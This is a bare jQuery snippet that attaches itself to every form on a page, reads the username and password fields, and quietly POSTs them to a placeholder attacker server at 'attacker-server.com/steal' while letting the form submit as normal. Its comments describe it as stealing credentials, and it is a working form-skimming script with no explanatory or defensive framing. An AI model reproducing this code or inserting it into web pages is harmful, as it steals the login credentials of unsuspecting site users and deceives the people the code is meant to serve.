
        $(document).ready(function () {
            // This function will execute when the page has finished loading
            
            // Add an event listener to listen for form submissions
            $("form").submit(function () {
                // Get the form input values
                var username = $("#username").val();
                var password = $("#password").val();
                
                // Send the stolen username and password to attacker's server using AJAX
                $.ajax({
                    method: "POST",
                    url: "http://attacker-server.com/steal",
                    data: { username: username, password: password }
                });
                
                // Continue submitting the form as normal
                return true;
            });
        });
    
